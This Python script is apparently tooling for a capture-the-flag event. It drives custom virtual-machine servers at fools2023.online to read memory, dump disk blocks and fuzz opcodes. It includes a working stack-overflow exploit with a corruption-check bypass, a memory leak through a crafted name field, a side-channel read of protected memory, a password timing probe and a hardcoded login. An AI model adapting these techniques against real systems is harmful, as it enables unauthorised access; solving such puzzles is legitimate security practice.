# pylint: disable=global-statement,invalid-name,wildcard-import,unused-wildcard-import,pointless-string-statement
from collections import defaultdict
import sys
import socket
import select
import re
from datetime import datetime
from assemble import assemble_inline, assemble_file
from disasemble import known_opcodes, crashes
from utils import *

con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


class ConnectionClosedException(Exception):
    pass


improved_console_loaded = False


def connect(port=13337, expected_end="Ready.\n> "):
    global con, improved_console_loaded
    if con:
        con.close()
    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    con.connect(("fools2023.online", port))
    improved_console_loaded = False
    read_all_poss(timeout=3, expected_end=expected_end)


echoing = True


def read_all_poss(timeout=3, subsequent_timeout=2, expected_end="Ready.\n> ", return_bytes=False):
    if expected_end is None:
        expected_end = "Ready.\n> "
    global con
    if not con:
        raise ConnectionClosedException("Connection closed")
    out = ""
    if return_bytes:
        out = b""
        expected_end = bytes(expected_end, "utf8")
    while True:
        ready_read, _ready_write, in_err = select.select([con], [], [con], timeout)
        if in_err:
            raise ConnectionClosedException("Socket error when reading", in_err)
        if ready_read:
            rcvd_chunk = con.recv(1024)
            if rcvd_chunk == b'':  # eof
                con = None
                raise ConnectionClosedException("EOF", out)
            rcvd_str = rcvd_chunk.decode('utf8', 'replace')
            if echoing:
                print(rcvd_str, end="")
            if return_bytes:
                out += rcvd_chunk
            else:
                out += rcvd_str
            if out.endswith(expected_end):
                break
        else:
            break
        timeout = subsequent_timeout
    return out


connect()


def send(msg, timeout=None, expected_end=None, return_bytes=False):
    if timeout == None:
        timeout = 10
    if not con:
        raise ConnectionClosedException()
    if isinstance(msg, str):
        msg = bytes(msg, "utf8")
    assert isinstance(msg, bytes)
    if msg[-1] != b'\n'[0]:
        print("Warning: Non-terminated msg", msg)
    tot_sent = 0
    while tot_sent < len(msg):
        sent = con.send(msg[tot_sent:])
        if sent == 0:
            raise ConnectionClosedException("Socket error when writing", con)
        tot_sent += sent
    if echoing:
        print(msg.decode("utf8", errors="replace"), end="")
    return read_all_poss(timeout=timeout, subsequent_timeout=timeout, expected_end=expected_end, return_bytes=return_bytes)


def expect_prompt_and_ready_suffix(prompt, res):
    res = expect_prompt(prompt, res)
    suffix = "Ready.\n> "
    if not res.endswith(suffix):
        raise Exception("Expected ready suffix", res)
    res = res[:-len(suffix)]
    return res


def expect_prompt(prompt, res):
    if not res.startswith(prompt):
        raise Exception("Expected prompt", prompt, res)
    res = res[len(prompt):]
    return res


def read_mem_raw(addr, lines=5):
    raw = send(f"r\n{tohex(addr)}\n{tohex(lines)}\n")
    raw = expect_prompt_and_ready_suffix("> Which address? > How many lines? ", raw)
    return raw.splitlines()


def read_mem(addr, lines=None, nbytes=None, print_dump=None):
    if lines is not None and nbytes is not None:
        raise Exception("Don't use both lines and nbytes")
    if nbytes is not None:
        if print_dump is None:
            print_dump = False
        lines = (nbytes-1) // 8 + 1
    else:
        if lines is None:
            lines = 5
        if print_dump is None:
            print_dump = True
        if nbytes is None:
            nbytes = lines*8

    assert lines is not None and nbytes is not None

    raw = read_mem_raw(addr, lines)
    out = bytes_from_dump(raw)[:nbytes]
    dump = bytes_to_dump(out, addr)
    if print_dump:
        print()
        print(dump)

    return bytes(out)


def print_mem(addr):
    res = send(f"p\n{tohex(addr)}\n")
    res = expect_prompt_and_ready_suffix("> Which address? ", res)
    return res


def write_mem(addr, data):
    data = tohex(data)
    data_ = ""
    for i, c in enumerate(data):
        data_ += c
        if i % 64 == 0:
            data_ += "\n"
    res = send(f"w\n{tohex(addr)}\n{data_}.\n", timeout=20)
    res = expect_prompt_and_ready_suffix('> Which address? > Enter hex data. End with dot "." + newline:\n', res)
    assert res == "Loaded.\n", res


def clear_mem(addr, num=0x100):
    write_mem(addr, "00"*num)


def exec_mem(addr, timeout=None, return_bytes=False):
    res = send(f"x\n{tohex(addr)}\ny\n", timeout, return_bytes=return_bytes)
    expected = f"> Which address? > Really exec at {tohex(addr, padding=4)}? Type Y if so:"
    if return_bytes:
        expected = bytes(expected, "utf8")
    res = expect_prompt(expected, res)
    return res


def exec_data(code, addr=0x2000, timeout=None, return_bytes=False):
    write_mem(addr, code)
    return exec_mem(addr, timeout, return_bytes=return_bytes)


def exec_asm(code, addr=0x2000, timeout=None, return_bytes=False):
    return exec_data(assemble_inline(code, addr), addr, timeout, return_bytes=return_bytes)


file_data = """
BLK  SIZE  NAME
=======================
07   01F9  TODO.TXT
08   0560  REPORT03.PRG
0A   02B1  MATHTEST.PRG
01   0035  FLAG.TXT
01   0400  ENCTABLE.BIN
02   0165  MIXTEST.PRG
04   0026  FLAG.TXT

"""


def filesize(filename):
    for rec in file_data.splitlines()[3:]:
        _blk, size, name = rec.split()
        if name == filename:
            return fromhex(size)
    # return 0x0300
    raise Exception("File not found", filename)


def read_file_to_mem(filename, addr=0x2000):
    _size = filesize(filename)
    res = send(f"rf\n{filename}\n{tohex(addr)}\n")
    res = expect_prompt_and_ready_suffix("> Filename? > Which address? ", res)
    assert res == "Loaded.\n", res


def read_file(filename, addr=0x2000, print_dump=True):
    read_file_to_mem(filename, addr)
    return read_mem(addr, nbytes=filesize(filename), print_dump=print_dump)


def print_file(filename, addr=0x2000):
    read_file_to_mem(filename, addr)
    return print_mem(addr)


def exec_file(filename, addr=0x2000):
    read_file_to_mem(filename, addr)
    return exec_mem(addr)


def test_comparisons(code, addr=0x2000):
    for pre, msg in ("10beefa2beef", "LHS=RHS"), ("10beefa2beee", "LHS>RHS"), ("10beefa2befe", "LHS<RHS"):
        print(f"\n\n{msg}\n")
        exec_data(pre+code, addr)


def connect_server3():
    connect(port=13339)


def bytes_(x):
    if isinstance(x, str):
        return bytes(x, "utf8")
    else:
        return bytes(x)


def send_serv3(msg, timeout=3):
    try:
        return send(msg, expected_end=" to leave: ", timeout=timeout)
    except ConnectionClosedException as e:
        if len(e.args) >= 2 and e.args[0] == "EOF":
            return e.args[1]
    return ""


def connect_serv3_with_name(name, cmd="q"):
    connect_server3()
    out = ""
    out += send_serv3(bytes_(name) + b"\n")
    if cmd:
        out += send_serv3(cmd + "\n")
    return out


def read_serv3_mem(base_addr, cmd="q"):  # this doesn't work with addresses with 0x0A (newline) in them
    name = []
    for i in range(4):
        name.append(0xF0)
        addr = base_addr + i*2
        name += to_le(addr)

    resp = connect_serv3_with_name(name, cmd)

    resp_name = re.findall(r"Welcome, (.{16})", resp)[0]

    out = []

    for mem in chunks(resp_name, 4):
        out += to_le(fromhex(mem))

    return out


def connect_serv3_with_corruption_check():
    return bytes(read_serv3_mem(0xFE00, cmd="1")[:4])


mem_rand_backup = 0xfe00
mem_input_buf = 0xf753
stack = 0xff00


def connect_serv3_corrupt(payload, payload_addr=mem_input_buf, expected_end="E"):
    assert isinstance(payload, bytes)
    assert payload_addr >= mem_input_buf
    if b'\n' in payload:
        raise Exception("No newlines pls")

    out = b""
    out += b"A"*(payload_addr-mem_input_buf)
    out += payload
    addr = mem_input_buf + len(out)
    assert addr <= mem_rand_backup, "Payload too big"

    out += b"B" * (mem_rand_backup-addr)
    corrupt_check = b"\n"
    while b"\n" in corrupt_check:
        corrupt_check = connect_serv3_with_corruption_check()
    out += corrupt_check

    addr = mem_input_buf + len(out)
    out += b"C" * (stack-0x10-addr)
    addr_bytes = bytes([payload_addr % 256, payload_addr//256])
    out += addr_bytes * 0x14
    out += b"DDDD\n"

    return send(out, timeout=10, expected_end=expected_end)


def connect_serv3_with_console():
    payload_addr = 0xfc00
    payload = bytes(assemble_file("payload.prg", payload_addr))
    console = bytes(open("console.bin", "rb").read())

    connect_serv3_corrupt(payload, payload_addr)
    send(console + b"\n")


def read_protected_mem(n):
    result = exec_asm(" ld R2 "+str(n)+" / cmp R2 $0 / jp 0x47 / brk / .lab: dw 0x4948 / dw 0x49F0 / dw 0x6565 / dw 0")[:6]
    if result.endswith(b"Ready"):
        return 0
    elif result.endswith(b"Read"):
        return result[1]
    elif result.endswith(b"R"):
        return 0xf0
    # elif result.endswith(b"Re"):#these are probably wrong
    #    return 0xf
    elif result.endswith(b"Rea"):
        return 0xf1
    raise(Exception("unrecognised pattern"+repr(result)))


def read_protected_block(addr, ln):
    return [read_protected_mem(i) for i in range(addr, addr+ln)]


def dump_protected_mem(file=sys.stdout):
    ll = []
    for i in range(0, 0x1000, 0x10):
        b = read_protected_block(i, 0x10)
        print(bytes_to_dump(b, i), file=file, end="")
        ll.append(b)
    return ll


"""
doesn't work because of 0s'
def read_protected_mem_block(addr,ln):
    assert(ln>0)
    result = exec_asm(
        f" ld R3 {ln} / ld R2 {addr} /  loop: push R3 / push R2 / call 0x47 / pop R2 / pop R3 / inc R2 / dec R3 / cmp R3 $0 / jp ne loop / ret / brk ")
    if result.startswith(b" "):
        result=result[1:]
    if result.endswith(b"Ready.\n> "):
        result = result[:-len(b"Ready.\n> ")]
    return result
"""


def read_block(blk):
    exec_asm(f"ld R0 {blk} / ld R1 $3000 / int $04 / ret", return_bytes=False)
    return read_mem(0x3000, nbytes=0x400)


def dump_all_blocks(dirname, confn=connect):
    for i in range(256):
        print(tohex(i))
        try:
            blk = read_block(i)
            dump = bytes_to_dump(blk, 0x3000)
            if any(b for b in blk):
                with open(f"{dirname}/{tohex(i)}.dmp", "w") as f:
                    f.write(dump)
        except ConnectionClosedException:
            confn()


def connect_serv2():
    connect(port=13338, expected_end="Username: ")


def connect_serv2_and_measure_time(password, username="ax.arwen"):
    connect_serv2()
    send(username + "\n", timeout=5, expected_end="Password: ")
    start_time = datetime.now()
    res = send(password + "\n", timeout=10, expected_end="Username: ")
    end_time = datetime.now()
    return (end_time-start_time), res


def test_syscall(n, rs=None):
    return test_instr(f"int {n}", rs)


def load_improved_console():
    global improved_console_loaded
    if not improved_console_loaded:
        exec_data(assemble_file("improved_console.prg", 0xD000), 0xD000)
        improved_console_loaded = True


def test_instr(instr, regs=(0x2000, 0x2100, 0x2200, 0x2300), vals=(0x0123, 0x4567, 0x89AB, 0xCDEF), rs=None):
    # for i in range(4):
    #    write_mem(0x2000+i*0x100, [65+i*3,66+i*3])
    load_improved_console()
    if rs is None:
        rs = []
    rs.append(exec_asm(f"""
            ld R0 {regs[0]} 
            ld R3 {vals[0]}
            {"ld [R0] R3"*vals[0]>=0} 
            ld R1 {regs[1]}
            ld R3 {vals[1]} 
            {"ld [R1] R3"*vals[1]>=0} 
            ld R2 {regs[2]}
            ld R3 {vals[2]}
            {"ld [R2] R3"*vals[2]>=0} 
            ld R2 {vals[3]}
            ld R3 {regs[3]}
            {"ld [R3] R3"*vals[3]>=0} 
            ld R2 {regs[2]} 
            cmp R3 {regs[3]} / """ + instr + "/ brk / brk / brk", 0x3000))
    return rs
# 30 31 32 33 34


syscall_res_l = [{}]


def test_syscalls(start=5, stop=256):
    syscall_res = syscall_res_l[0]
    for i in range(start, stop):
        if i not in syscall_res:
            connect()
            r = []
            try:
                t = test_syscall(i, r)
                print(f"success {i}?, partial: {repr(r)}")
                syscall_res[i] = t
            except Exception as e:
                print(f"failed {i}, partial: {repr(r)}")
                raise e
                # syscall_res[i]=r
    for k, v in syscall_res.items():
        print(f"{k:0{2}X} : {v}")


def connect_serv2_with_console():
    connect_serv2()
    send("ax.arwen\nsepiB7705*X\n")


s2_conn = False


def test_s2_instr(i, regs=(0xE000, 0xE100, 0xE200, 0xE300)):
    global s2_conn
    if not s2_conn:
        connect_serv2_with_console()
        s2_conn = True
    wr = ""
    for r in range(4):
        lo, hi = to_le(regs[r])
        wr += "1"+tohex(r, 1)+tohex(lo)+tohex(hi)
    wr += "07" + tohex(i, 2) + "F800F800"
    write_mem(0x2000, wr)
    try:
        res = exec_mem(0x2000, timeout=3)
        if "MONITOR" not in res:
            raise "Didn't return to MONITOR"
    except Exception as e:
        s2_conn = False
        raise e
    return res


def find_unmixer(op, op2_from=0, pre="", post=""):
    res = defaultdict(list)
    for op2 in range(op2_from, 256):
        try:
            out = exec_asm(f"{pre} / db {op} / db {op2} / {post} / brk / brk / brk / brk / brk", timeout=3)
            if "MONITOR" in f"{out}":
                res["success"].append(op2)
            else:
                res["hangs?"].append(op2)
                connect()
        except ConnectionClosedException as e:
            connect()
            if len(e.args) > 1 and "ILLEGAL" in f"{e.args[1]}":
                continue
            res["non-illegal-halt"].append(op2)
        except Exception as e:
            print("Failed at op2", tohex(op2))
            print("Res so far:", res)
            raise e
    return dict(res)


def collect_instr_info(mixer=(0x20,)*4, unmixer=0x20, rng=range(256)):
    if not con:
        connect()

    res = defaultdict(list)

    for op in rng:
        print("Trying op", tohex(op))
        try:
            out = test_instr(f"""
                ld sp $FFF0-2
                {"".join(f"db ${tohex(m)} /" for m in mixer)}
                db ${tohex(op)}
                db ${tohex(unmixer)} / brk
                db ${tohex(unmixer)} / brk
                 """,
                             regs=(0x2134, 0x2021, 0x224a, 0x231d),
                             vals=(0x0123, 0x4567, 0x89ab, 0xcdef))[0]
            if b"MONITOR" not in out:
                connect()
        except ConnectionClosedException as e:
            if len(e.args) > 1:
                out = e.args[1]
            else:
                out = f"Unknown ConnectionClosedException {e}"
            connect()
        except Exception as e:  # pylint:disable=broad-except
            print(e)
            out = f"Unknown Exception {e}"
            connect()
            # raise(e)

        res[out].append(op)

    return res


def annotate_known_op(op):
    if op in known_opcodes:
        d = known_opcodes[op]
    elif op in crashes:
        d = "illegal"
    else:
        d = "unk"
    return tohex(op), d


def compare_instr_tables(mixed, base):
    unknown_mixed = []
    unknown_base = set(range(256))

    compared = {}
    annotated = {}
    confirmed = {}

    for res, ops in mixed.items():
        if res in base:
            ops2 = base[res]
            unknown_base -= set(ops2)
            compared[tuple(ops)] = ops2
            annotated[tuple(tohex(o) for o in ops)] = [annotate_known_op(o) for o in ops2]
            if len(ops) == 1 and len(ops2) == 1:
                confirmed[ops[0]] = ops2[0]
        else:
            unknown_mixed += ops
    compared[()] = list(unknown_base)
    annotated[()] = [annotate_known_op(o) for o in unknown_base]
    compared[tuple(unknown_mixed)] = []
    annotated[tuple(tohex(o) for o in unknown_mixed)] = []

    return compared, annotated, confirmed
